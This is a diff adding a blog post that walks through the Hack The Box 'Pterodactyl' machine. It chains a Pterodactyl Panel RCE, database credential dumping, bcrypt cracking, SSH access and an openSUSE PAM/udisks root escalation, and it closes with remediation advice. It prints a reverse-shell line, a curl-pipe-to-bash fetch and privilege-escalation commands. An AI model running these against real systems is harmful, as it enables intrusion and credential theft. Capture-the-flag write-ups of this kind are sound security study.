@@ -1,0 +1,355 @@
+export const frontmatter = {
+  title: "Hack The Box Pterodactyl Machine Writeup",
+  slug: "hack-the-box-pterodactyl-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Pterodactyl machine, covering virtual host discovery, Pterodactyl Panel RCE exploitation, credential extraction, lateral movement, and chained openSUSE privilege escalation using CVE-2025-6018 and CVE-2025-6019.",
+  date: "2026-05-18",
+};
+
+export const metadata = {
+  title:
+    "HackTheBox Pterodactyl Writeup – Pterodactyl RCE to Root via PAM & libblockdev | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Pterodactyl writeup demonstrating vhost enumeration, exploitation of CVE-2025-49132 in Pterodactyl Panel, MariaDB credential abuse, bcrypt hash cracking, SSH lateral movement, and root privilege escalation using chained openSUSE PAM and libblockdev vulnerabilities.",
+};
+
+## Introduction
+
+Pterodactyl is a Medium-difficulty Linux machine that features a realistic attack chain, beginning with a Remote Code Execution vulnerability in a hidden game server management panel. After moving laterally using cracked database credentials, attackers achieve root access by chaining openSUSE PAM and `libblockdev` vulnerabilities to bypass PolicyKit restrictions and execute a malicious filesystem mount.
+
+## Attack Chain
+
+- **Virtual Host Discovery:** Enumeration reveals the hidden `panel.pterodactyl.htb` endpoint.
+- **Initial Access:** Exploitation of CVE-2025-49132 in Pterodactyl Panel v1.11.10 yields Remote Code Execution as the `wwwrun` user.
+- **Information Disclosure:** Environmental variables reveal MariaDB credentials, allowing access to the database to extract password hashes.
+- **Lateral Movement:** Cracking a bcrypt hash grants SSH access to the user `phileasfogg3`.
+- **Privilege Escalation (Part 1):** Exploitation of CVE-2025-6018 by injecting environment variables via `~/.pam_environment` tricks the PAM stack into treating a remote SSH session as an active local console, bypassing PolicyKit restrictions.
+- **Privilege Escalation (Part 2):** Leveraging the elevated PolicyKit privileges, CVE-2025-6019 is exploited by forcing `udisks` and `libblockdev` to mount a malicious XFS image. A missing `nosuid` protection on the temporary mount allows the execution of an SUID binary, resulting in a root shell.
+
+## Setup
+
+Download the VPN configuration file from the webpage and connect using `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use `ping <ip_addr>`.
+
+Upon visiting the IP address in a browser, it redirects to `http://pterodactyl.htb`, but the page fails to load.
+
+Add `pterodactyl.htb` to `/etc/hosts` with `echo '<ip_addr>	pterodactyl.htb' | sudo tee -a /etc/hosts`
+
+> **NOTE:** We need to add an entry to `/etc/hosts` because the domain `pterodactyl.htb` is not publicly registered. When you visit the target IP in a browser using this domain, the system attempts to resolve it via public DNS servers. Since the domain does not exist publicly, DNS resolution fails. By adding the IP address and domain to `/etc/hosts`, you create a local mapping, allowing your system to resolve `pterodactyl.htb` to the correct IP address without relying on external DNS servers.
+
+## Initial Access
+
+Perform basic Nmap scan with version detection with `nmap -sV <ip_addr>`
+
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 22:59 IST
+Nmap scan report for 10.129.239.78
+Host is up (0.45s latency).
+Not shown: 970 filtered tcp ports (no-response), 26 filtered tcp ports (admin-prohibited)
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+80/tcp   open   http       nginx 1.21.5
+443/tcp  closed https
+8080/tcp closed http-proxy
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.02 seconds
+```
+
+Try Vhost discovery in `gobuster` with `gobuster vhost -u http://pterodactyl.htb -w ~/Desktop/subdomains-top1million-20000.txt --append-domain`
+
+> **NOTE:** Wordlist for `gobuster` scan can be found [here](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/DNS/subdomains-top1million-20000.txt)
+
+Gobuster scan shows:
+
+```
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://pterodactyl.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /home/vinod/Desktop/subdomains-top1million-20000.txt
+[+] User Agent:                gobuster/3.8
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+panel.pterodactyl.htb Status: 200 [Size: 1897]
+Progress: 20000 / 20000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+Visiting `http://pterodactyl.htb` and viewing it's source code reveals `/changelog` endpoint
+
+Upong visiting `http://pterodactyl.htb/changelog.txt` it reveals
+
+- Version 1.20.X
+- DNS routing for `play.pterodactyl.htb` (**NOTE:** `play.pterodactyl.htb` was not revealed by `gobuster` scan)
+- Pterodactyl Panel `v1.11.10` is installed
+- MariaDB `11.8.3` is used as the backend database
+- PHP is installed on server with required extensions
+
+> **NOTE:** Since we have discovered two new vhosts, we need to add them to `/etc/hosts` with `echo '<ip_addr>	pterodactyl.htb panel.pterodactyl.htb play.pterodactyl.htb' | sudo tee -a /etc/hosts`
+
+`http://pterodactyl.htb/phpinfo.php` revals that it's running PHP `v8.4.8`
+
+A quick google search and `searchsploit` reveals that, Pterodactyl Panel `v1.11.11` is vulnerable to Remote Code Execution (RCE), that implies `v1.11.10` is vulnerable to RCE and it's assigned [**CVE-2025-49132**](https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843)
+
+A working POC, can be found [here](https://github.com/malw0re/CVE-2025-49132-Mods)
+
+Save the below code as `shell.sh`:
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/<ip_addr_of_linux>/<port> 0>&1
+```
+
+Host it with `python3 -m http.server 8080`
+
+Start listener with `nc -lvnp <port>`
+
+Run POC script with `python3 ape1.py --host panel.pterodactyl.htb --interactive`:
+
+```
+
+╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                 ║
+║           Target: panel.pterodactyl.htb                   ║
+╚═══════════════════════════════════════════════════════════╝
+
+[+] Entering interactive shell mode
+[*] Type 'exit' or 'quit' to leave
+
+shell>
+```
+
+And fetch `shell.sh` and execute it with `bash` as `curl http://<ip_addr_of_linux>:8080/shell.sh | bash`
+
+Upon successful exploitation, you will see:
+
+```
+connect to [10.10.14.12] from (UNKNOWN) [10.129.236.60] 37482
+bash: cannot set terminal process group (1207): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public>
+```
+
+`env` reveals:
+
+```
+wwwrun@pterodactyl:/var/www/pterodactyl/public> env
+DB_PORT=3306
+...<SNIP>...
+DB_HOST=127.0.0.1
+...<SNIP>...
+DB_PASSWORD=P▇▇▇▇▇▇▇▇l
+...<SNIP>...
+APP_URL=http://panel.pterodactyl.htb
+...<SNIP>...
+DB_USERNAME=pterodactyl
+...<SNIP>...
+DB_DATABASE=panel
+...<SNIP>...
+```
+
+Connect to database with `mysql -u pterodactyl -p -h 127.0.0.1 -P 3306 panel` with password when prompted
+
+Once authenticated use `SHOW DATABASES;` then `USE panel;` then `DESCRIBE users;` then dump with `SELECT id, username, password, root_admin FROM users;` and we get:
+
+```
++----+--------------+--------------------------------------------------------------+------------+
+| id | username     | password                                                     | root_admin |
++----+--------------+--------------------------------------------------------------+------------+
+|  2 | headmonitor  | $2▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇D2 |          1 |
+|  3 | phileasfogg3 | $2▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇Pi |          0 |
++----+--------------+--------------------------------------------------------------+------------+
+```
+
+## Lateral Movement
+
+Save hashes with:
+
+```
+echo '$2▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇D2' > hash1.txt
+echo '$2▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇Pi' > hash2.txt
+```
+
+Use `hashcat` mode `3200` to crack it, use `hashcat -m 3200 hash1.txt rockyou.txt` and `hashcat -m 3200 hash2.txt rockyou.txt`
+
+**WHY MODE 3200:** The `$2y$10$` prefix identifies these as bcrypt hashes with cost factor 10. Hashcat's mode -m 3200 handles bcrypt ($2*$, Blowfish (Unix)).
+
+> **NOTE:** `rockyou.txt` doesn't contain password for `hash1.txt`
+
+To view cracked password use `hashcat -m 3200 hash2.txt rockyou.txt --show`:
+
+```
+$2▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇Pi:!▇▇▇▇▇▇x
+```
+
+Login via SSH for `phileasfogg3` as `ssh phileasfogg3@<ip_addr>`:
+
+```
+(phileasfogg3@10.129.236.128) Password: !▇▇▇▇▇▇x
+Have a lot of fun...
+Last login: Fri May 1 15:10:59 2026 from 10.10.14.12
+phileasfogg3@pterodactyl:~>
+```
+
+Grab user flag with `cat /home/phileasfogg3/user.txt`:
+
+```
+ec▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ad
+```
+
+## Internal Enumeration
+
+After performing basic enumeration—such as checking for SUID binaries, writable files, and scheduled cron jobs—and finding no useful results, the next logical step in a privilege escalation methodology is to investigate known vulnerabilities associated with the operating system’s distribution and version.
+
+Inspection of `/etc/os-release` confirms that the target is running `openSUSE Leap 15.6`. A Google search for `openSUSE Leap 15.6 privilege escalation` reveals that the system is affected by **CVE-2025-6018** and **CVE-2025-6019**, with further technical details available in the [Qualys research article](https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks)
+
+CVE-2025-6018 affects the Pluggable Authentication Modules (PAM) framework, which is responsible for managing user authentication and session handling on Linux systems. In openSUSE 15, the PAM stack determines which users are considered “active” for privileged operations. A misconfiguration in this logic can incorrectly classify remote SSH sessions as local console sessions. Since “allow_active” is used by polkit to grant access to sensitive system actions reserved for physically present users, this misconfiguration can allow an unprivileged user to perform actions that should normally be restricted.
+
+To validate the vulnerability on the target system, the next step is to identify which PolicyKit actions are permitted for “active” users while remaining restricted for non-active users. This can be achieved by enumerating available actions using `pkaction --verbose`.
+
+To narrow down the scope, the Qualys research article provides relevant mitigation and exploitation guidance under the “Mitigation Guideline for libblockdev/udisks Vulnerability” section, which specifically highlights the action `org.freedesktop.udisks2.modify-device` as a sensitive privilege-controlled operation.
+
+Based on this, the investigation can be focused on the specific PolicyKit rule by querying `pkaction --action-id org.freedesktop.udisks2.modify-device --verbose`:
+
+```
+org.freedesktop.udisks2.modify-device:
+  description:       Modify a device
+  message:           Authentication is required to modify a device
+  vendor:            The Udisks Project
+  vendor_url:        https://github.com/storaged-project/udisks
+  icon:              drive-removable-media
+  implicit any:      auth_admin
+  implicit inactive: auth_admin
+  implicit active:   yes
+```
+
+The presence of `implicit active: yes` suggests that the PolicyKit rule treats remote sessions as active users, confirming that the system is affected by CVE-2025-6018.
+
+When a user logs in via SSH, the `pam_env` module reads the user’s `~/.pam_environment` file by default. Notably, `pam_env` is invoked early in the PAM authentication (“auth”) stack, while the `pam_systemd` module is executed later as part of the session (“session”) stack.
+
+As a result of this ordering, an unprivileged user can control environment variables before session handling occurs. Specifically, an attacker logging in via SSH can leverage `pam_env` to inject arbitrary environment variables into the PAM context.
+
+By setting environment variables such as `XDG_SEAT=seat0` and `XDG_VTNR=1` in `~/.pam_environment`, an unprivileged attacker can manipulate how their session is classified. This can be achieved using the following commands:
+
+```
+echo "XDG_SEAT=seat0" > ~/.pam_environment
+echo "XDG_VTNR=1" >> ~/.pam_environment
+```
+
+This forces the session to be treated as a local, physically active user session. In the context of PolicyKit, this effectively grants the attacker “allow_active” privileges, enabling access to actions that would normally be restricted.
+
+For the `pam_env` module to load the updated `~/.pam_environment` file, the SSH session must be restarted. Therefore, log out and reconnect to the system via SSH.
+
+Once reconnected, the session state can be verified using `loginctl show-session $XDG_SESSION_ID`:
+
+```
+...<SNIP>...
+Active=yes
+...<SNIP>...
+```
+
+## Privilege Escalation
+
+CVE-2025-6018 and CVE-2025-6019 can be chained together to achieve full root privilege escalation on the target system.
+
+**Vulnerability Overview**
+
+The `udisks` daemon is responsible for managing storage devices (e.g., USB drives and hard disks) and operates with root privileges to perform system-level tasks such as mounting filesystems. Under normal circumstances, when a regular user attempts to mount a filesystem, `udisks` enforces security restrictions by applying the `nosuid` and `nodev` mount options.
+
+To resize an XFS filesystem, the system relies on the `xfs_growfs` utility, which requires the target filesystem to be mounted. To facilitate this, the udisks daemon utilizes the `libblockdev` library to handle the resizing process.
+
+If the XFS filesystem is not already mounted, `libblockdev` automatically mounts it to a temporary directory under `/tmp`. However, during this temporary mount process, the nosuid and nodev protections are not applied due to a misconfiguration.
+
+**Exploitation**
+
+A public proof-of-concept (PoC) is available and can be used to exploit this vulnerability chain. First, clone the repository on the attacker machine:
+
+```
+git clone https://github.com/MichaelVenturella/CVE-2025-6018-6019-PoC.git
+cd CVE-2025-6018-6019-PoC/
+```
+
+On attacker machine run `./build_poc.sh`:
+
+```
+[*] Building CVE-2025-6018/6019 PoC...
+[+] Compiled static rootbash.
+[+] Created XFS image.
+[+] Injected SUID shell into image.
+[+] Compiled static catcher.
+[SUCCESS] Upload 'exploit.img' and 'catcher' to the target /tmp folder.
+```
+
+> **NOTE:** If you are facing issues running the script, run it with sudo privileges.
+
+If successful it will create:
+
+- Creates `exploit.img` (400MB XFS image with SUID shell).
+- Compiles `catcher` (The race-condition winner).
+
+> **Note:** You cannot use WSL directly to build the POC with `./build_poc.sh` because its file system behavior differs from that of a native Linux environment.
+
+Since `exploit.img` is 400MB compress it with `gzip` for faster transfer to target machine with `gzip exploit.img`
+
+For file transfer start python server with `python -m http.server 8080` on attacker machine
+
+Fetch files on the target machine (In `/tmp`):
+
+```
+wget http://<ip_addr>:8080/exploit.img.gz
+wget http://<ip_addr>:8080/exploit.sh
+wget http://<ip_addr>:8080/catcher
+```
+
+Once files are receved, decompress `exploit.img.gz` with `gunzip exploit.img.gz`
+
+Modify file permission for `exploit.sh` and `catcher`:
+
+```
+chmod +x catcher exploit.sh
+```
+
+Run the exploit with `./exploit.sh`:
+
+```
+[+] Session is Active. Polkit bypass enabled.
+[*] Starting Background Trigger (Wait 2s)...
+[*] Starting Foreground Catcher...
+[*] HOLD TIGHT. ROOT SHELL INCOMING.
+[*] Sniper started. Waiting for ANY loop mount...
+[*] (BG) Setting up loop device...
+[*] (BG) Triggering Resize on /org/freedesktop/UDisks2/block_devices/loop0...
+
+[!!!] HIT! Mounted at: /tmp/blockdev.QUPSO3
+pterodactyl:/tmp #
+
+```
+
+Grab the root flag with `cat /root/root.txt`:
+
+```
+be▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇de
+```
+
+## Mitigation and Remediation
+
+To secure the system against the attack paths demonstrated in this scenario, the following remediations should be applied:
+
+- **Update Pterodactyl Panel (CVE-2025-49132):** Upgrade the Pterodactyl Panel to version 1.11.11 or later to patch the Remote Code Execution vulnerability.
+- **Enforce Password Complexity:** The user `phileasfogg3` utilized a weak password that was easily cracked using a standard dictionary attack (`rockyou.txt`). Implement strict password policies requiring a mix of character types and sufficient length, and consider enforcing multi-factor authentication (MFA) for SSH access.
+- **Remediate PAM Misconfiguration (CVE-2025-6018):** Apply the latest security patches from the openSUSE repositories for the `pam` package. If patching is not immediately feasible, disable the ability for `pam_env` to read user controlled `~/.pam_environment` files by modifying the PAM stack configuration, ensuring users cannot spoof their session state.
+- **Patch udisks and libblockdev (CVE-2025-6019):** Update `udisks2` and `libblockdev` to their latest patched versions. System administrators must ensure that all temporary mounts initiated by system services rigidly enforce `nosuid` and `nodev` options to prevent the execution of malicious SUID binaries from untrusted filesystems.
